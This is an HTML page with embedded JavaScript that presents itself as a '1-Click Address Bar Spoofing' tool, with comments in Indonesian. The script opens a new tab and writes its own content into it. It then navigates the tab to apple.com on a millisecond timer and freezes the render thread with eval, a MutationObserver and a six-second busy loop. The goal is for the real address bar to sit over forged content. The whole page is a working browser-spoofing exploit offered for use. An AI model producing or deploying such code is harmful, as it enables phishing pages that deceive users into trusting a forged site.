<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Ultimate 1-Click Force Lock - HALLO</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #09090b;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        gap: 16px;
        padding: 20px;
        box-sizing: border-box;
      }
      h1 {
        font-size: 22px;
        margin-bottom: 10px;
        color: #f5f5f7;
        text-align: center;
      }
      button {
        width: 100%;
        max-width: 420px;
        padding: 24px;
        font-size: 20px;
        font-weight: bold;
        background: #ff3b30;
        color: #fff;
        border: none;
        border-radius: 16px;
        cursor: pointer;
        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.45);
        transition: transform 0.1s ease;
      }
      button:active {
        transform: scale(0.96);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>1-Click Address Bar Spoofing</h1>
      <button id="startBtn">CLICK TO LOCK APPLE.COM</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. Membuka tab baru secara instan dan bersih
        const newTab = window.open("", "_blank");

        if (newTab) {
          // 2. Menyuntikkan halaman simpel berisi teks "HALLO" sesuai permintaan
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple</title>
              <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
              <h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
            </body>
            </html>
          `);
          newTab.document.close();

          try { newTab.focus(); } catch (e) {}

          // 3. Timing 1 (8ms): Memicu tarikan navigasi asinkron mutlak ke apple.com agar address bar berubah
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 8);

          // 4. Timing 2 (28ms): Mengunci render thread secara total serta memasang DOM Shield pengaman
          setTimeout(() => {
            try {
              newTab.eval(`
                // Melindungi elemen agar tidak terhapus atau tertimpa struktur asli apple.com
                try {
                  const observer = new MutationObserver(() => {
                    if (!document.getElementById('spoof-text')) {
                      document.body.innerHTML = '<h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                    }
                  });
                  observer.observe(document.documentElement, { childList: true, subtree: true });
                } catch(e) {}

                const startTime = Date.now();
                // Membekukan thread utama selama 6 detik penuh untuk menjaga state desynchronization
                while (Date.now() - startTime < 6000) {
                  const reflow = document.body.offsetHeight;
                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fcfcfc';

                  if (!document.getElementById('spoof-text')) {
                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                  }
                }
              `);
            } catch (e) {
              // Fallback lokal jika terhalang cross-origin context policy
              let start = Date.now();
              while (Date.now() - start < 6000) {}
            }
          }, 28);
        }
      };
    </script>
  </body>
</html>
